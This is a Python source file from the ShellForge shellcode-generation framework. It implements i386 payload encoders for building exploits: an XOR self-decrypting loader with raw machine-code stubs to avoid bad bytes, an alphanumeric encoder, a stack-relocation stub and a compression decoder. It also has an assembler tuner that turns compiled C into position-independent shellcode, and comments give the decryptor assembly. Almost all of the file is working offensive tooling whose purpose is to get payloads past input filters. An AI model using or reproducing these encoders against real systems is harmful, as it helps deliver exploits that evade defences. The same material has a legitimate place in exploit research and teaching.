#############################################################################
##                                                                         ##
## cpu_i386.py --- Classes for i386 CPUs                                   ##
##              see http://www.secdev.org/projects/shellforge/             ##
##              for more informations                                      ##
##                                                                         ##
## Copyright (C) 2003  Philippe Biondi <phil@secdev.org>                   ##
##                                                                         ##
## This program is free software; you can redistribute it and/or modify it ##
## under the terms of the GNU General Public License version 2 as          ##
## published by the Free Software Foundation.                              ##
##                                                                         ##
## This program is distributed in the hope that it will be useful, but     ##
## WITHOUT ANY WARRANTY; without even the implied warranty of              ##
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##
## General Public License for more details.                                ##
##                                                                         ##
#############################################################################

# $Id$

from cpu_any import *
import shellforge as sf
import struct

class Loaders_i386(Loaders):
    def loader_xor(self, shcode, avoid="\x00"):
        avd = []
        for a in avoid.split(","):
            if a.startswith("0x") and len(a) == 4:
                avd.append(int(a[2:],16))
            else:
                avd += map(lambda x: ord(x),list(a))

        needloader=0
        for c in avd:
            if chr(c) in shcode:
                needloader=1
                break
        if not needloader:
            return shcode
        for i in range(64,256)+range(1,64):
            ok=1
            for c in avd:
                if chr(c^i) in shcode:
                    ok=0
                    break
            if ok:
                key=i
                break
        if not ok:
            error("xor loader: no suitable xor key found.")
        sf.sflog.info("Applying xor loader. key=%#02x" % key)
        shcode = "".join(map(lambda x: chr(ord(x)^key), shcode))
        length = len(shcode)
        if length < 0x100:
            ld = ("\xeb\x0e\x90\x5e\x31\xc9\xb1"+chr(length)+"\x80\x36"+
                  chr(key)+"\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff")
        else:
            if length & 0xff == 0:
                length += 1
            ld = ("\xeb\x0f\x5e\x31\xc9\x66\xb9"+
                  chr(length&0xff)+chr(length>>8)+
                  "\x80\x36"+chr(key)+
                  "\x46\xe2\xfa\xeb\x05\xe8\xec\xff\xff\xff")
        ok=1
        for c in avd:
            if chr(c) in ld:
                ok=0
                break
        if not ok:
            error("xor loader: no suitable xor loader found")
        return ld+shcode



    def loader_alpha(self,shcode):
        def mkcpl(x):
            x = ord(x)
            set="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
            for c in set:
                d = ord(c)^x
                if chr(d) in set:
                    return 0,c,chr(d)
                if chr(0xff^d) in set:
                    return 1,c,chr(0xff^d)
            raise Exception,"No encoding found for %#02x"%x
        sf.sflog.info("Applying alpha loader")
        s="hAAAAX5AAAAHPPPPPPPPa"
        shcode=list(shcode)
        shcode.reverse()
        shcode = "".join(shcode)
        shcode += "\x90"*((-len(shcode))%4)
        for b in range(len(shcode)/4):
            T,C,D = 0,"",""
            for i in range(4):
                t,c,d = mkcpl(shcode[4*b+i])
                T += t << i
                C = c+C
                D = d+D
            s += "h%sX5%sP" % (C,D)
            if T > 0:
                s += "TY"
                T = (2*T^T)%16
                for i in range(4):
                    if T & 1:
                        s += "19"
                    T >>= 1
                    if T == 0:
                        break
                    s += "I"
        return s+"T\xc3"

    def loader_stackreloc(self,shcode,smart=1):
        loader = ("\x58"+                     # pop    %eax
                  "\xe8\x00\x00\x00\x00"+     # call   +0
                  "\x5b"+                     # pop    %ebx
                  "\x50"+                     # push   %eax
                  "\x83\xc3\xfa")             # add    $0xfffffffa,%ebx
        if smart != "0":
            loader += (
                  "\x89\xd8"+                 # mov    %ebx,%eax
                  "\x31\xe0"+                 # xor    %esp,%eax
                  "\xc1\xe8\x10"+             # shr    $0x10,%eax
                  "\x85\xc0"+                 # test   %eax,%eax
                  "\x75\x02")                 # jne    +2
        loader += "\x89\xdc"                  # mov    %ebx,%esp
        return loader+shcode

    def loader_compress(self, shcode, histo='5',length='2'):
        loader = "\xeb\x38\x5e\x46\xfc\xad\x89\xc1\x89\xf7\x01\xcf\x31\xc0\xac\xa8\x80\x78\x05\xaa\xe2\xf8\xeb\x27\x3d\xff\x00\x00\x00\x75\x03\xac\xe2\xf1\x51\x56\x89\xc1\x24\x1f\x89\xfe\x29\xc6\x80\xe1\x7f\xc0\xe9\x05\xf3\xa4\x5e\x59\xe2\xd6\xeb\x05\xe8\xc3\xff\xff\xff\xe9" # compress.nasm r44
        comp = ""
        histo = int(histo,0)
        length = int(length,0)
        if histo != 5 or length != 2:
            sf.sflog.warning("Compress: only works for histo and length default values")
        sf.sflog.info("Compress: histo=%i length=%i" % (histo, length))
        i = 0
        while i < len(shcode):
            c = shcode[i]
            if ord(c)&0x80:
                c = "\xff"+c
            j = min(2**length-1, i, len(shcode)-i+1)
            while j > 0:
                p = shcode[:i].rfind(shcode[i:i+j])
#                print >>sys.stderr,"%02i %4i %r %r" % (i,p,shcode[:i], shcode[i:i+j])
                if p >= 0 and p >= i-2**histo:
                    sf.sflog.debug("Compress: found @%i %i %r in %r" % (i,p-i, shcode[i:i+j],shcode[max(0,i-2**histo):i]))
                    c = chr(0x80|(j<<histo)|(i-p))
                    i += j-1
                    break
                j -= 1
            comp += c
            i += 1
        comp = loader+struct.pack("I",len(comp))+comp

        sf.sflog.info("Compress: [%i bytes] ==(C)==> [%i bytes]" % (len(shcode), len(comp)))
        return comp

class CodeTuner_gcc_i386(CodeTuner):
    def __init__(self, stack_reloc = 0, save_regs = 0):
        CodeTuner.__init__(self)
        self.stack_reloc = stack_reloc
        self.save_regs = save_regs
        
    def ____tune(self, code):
        sf.sflog.info("Tuning assembler code")
        codelines = code.splitlines()
        preamb = []
        rodata = []
        textpream = []
        mkstkframe = []
        beforeebx = []
        setebx = []
        afterebx = []
        afterleave = []
        end = []
        
        out = [["# Modified by shellforge v%s\n"%VERSION]]
        st1 = []
        st2 = []
        st3 = []
        state=0
        for l in codelines:
            sf.sflog.debug("[%i] %s"% (state, l))
            if l.find("@PLT") >= 0:
                error("Error at [%s]: Symbol not found" % (l.strip()), err=2)
            if l.find("@GOT(") >= 0:
                l = l.replace("mov","lea").replace("GOT","GOTOFF")
            if state == 0:
                if l.find(".rodata") >= 0:
                    state = 1
                    continue
                elif l.find(".text") >= 0:
                    state = 2
                else:
                    preamb.append(l);
            if state == 1:
                if l.find(".text") >= 0:
                    state = 2
                else:
                    rodata.append(l)
            if state == 2:
                textpream.append(l)
                if l.find("main:") >= 0:
                    state = 3
                continue
                    
            if state == 3:
                mkstkframe.append(l)
                if l.find("mov") >=0 and l.find("%esp") >= 0 and l.find("%ebp") >= 0:
                    state = 4
                continue
    
            if state == 4:
                if l.find("sub") >=0 and l.find(",%esp") >=0:
                    mkstkframe.append(l)
                else:
                    if rodata:
                        state = 5
                    else:
                        state = 7
                    
            if state == 5:
                if l.find("call") >= 0 and l.find(".L") >= 0:
                    state = 6
                else:
                    beforeebx.append(l)
    
            if state == 6:
                setebx.append(l)
                if l.find("GLOBAL_OFFSET_TABLE") >= 0:
                    state = 7
                continue
            if state == 7:
                if l.find("leave") >= 0:
                    state = 8
                else:
                    afterebx.append(l)
            if state == 8:
                if (l.find(".Lfe1:") >= 0 or 
                    (l.find(".size") >= 0 and l.find("main") >= 0)):
                    state = 9
                else:
                    afterleave.append(l)
            if state == 9:
                end.append(l)
    
        if state != 9:
            self.automaton_error()
    
        out += [preamb, textpream]
                
        if self.stack_reloc:
            out += [[ "\tpopl %eax",
                      "\tcall .L649",
                      ".L649:",
                      "\tpopl %ebx",
                      "\tpushl %eax",
                      "\taddl $[main-.L649],%ebx",
                      "\tmovl %ebx, %eax",
                      "\txorl %esp, %eax",
                      "\tshrl $16, %eax",
                      "\ttest %eax, %eax",                       
                      "\tjnz .Lnotinstack",                       
                      "\tmovl %ebx,%esp",
                      ".Lnotinstack:" ], mkstkframe, beforeebx ]
        else:
            out += [mkstkframe]
            if self.save_regs:
                out += [["\tpusha"]]
            out += [beforeebx]
            if rodata:
                out += [["\tcall .L649",
                         ".L649:",
                         "\tpopl %ebx",
                         "\taddl $[main-.L649],%ebx" ]]
    
        out += [afterebx]
        if self.save_regs:
            out += [["\tpopa"]]
        out += [afterleave, rodata, end]

        out = reduce(lambda x,y: x+["#---------"]+y, out)

        return "\n".join(out)+"\n"


class Binutils_i386(Binutils_BinaryTarget):
    
    def __init__(self, *args, **kargs):
        Binutils_BinaryTarget.__init__(self, *args, **kargs)
        self.CFLAGS  += "-march=i386 -fPIC"
# OSX tests #
#        self.CFLAGS  += " -fPIC -fPIE -march=i386"
#        self.ASSEMBLEFLAGS  += " -fPIC -fPIE -march=i386"
#        self.CFLAGS  += " -march=i386 -fPIC -fno-zero-initialized-in-bss"
        

##########################
## ASM used for loaders ##
##########################

    
# XOR decrypt for shellcodes < 256 bytes
# --------------------------------------
#
# "\xeb\x0d\x5e\x31\xc9\xb1" LENGTH "\x80\x36" XORKEY
# "\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
#
#  .text
#  .align 4
#  .globl main
#  .type main,@function
#  
#  main:
#          jmp .l2
#  .l1:
#          pop %esi
#          xorl %ecx, %ecx
#          movb LENGTH, %cl
#  .loop:
#          xorb XORKEY, (%esi)
#          incl %esi
#          loop .loop
#          jmp .l3
#  .l2:
#          call .l1
#  .l3:
#  #SHELLCODE HERE


# XOR decrypt for shellcodes >= 256 bytes
# --------------------------------------
# "\xeb\x0f\x5e\x31\xc9\x66\xb9" LENGTHW "\x80\x36" XORKEY
# "\x46\xe2\xfa\xeb\x05\xe8\xec\xff\xff\xff"
#  
# .text
# .align 4
# .globl main
# .type main,@function
# 
# main:
#         jmp .l2
# .l1:
#         pop %esi
#         xorl %ecx, %ecx
#         movw LENGTH, %cx
# .loop:
#         xorb XORKEY, (%esi)
#         incl %esi
#         loop .loop
#         jmp .l3
# .l2:
#         call .l1
# .l3:
# #SHELLCODE 
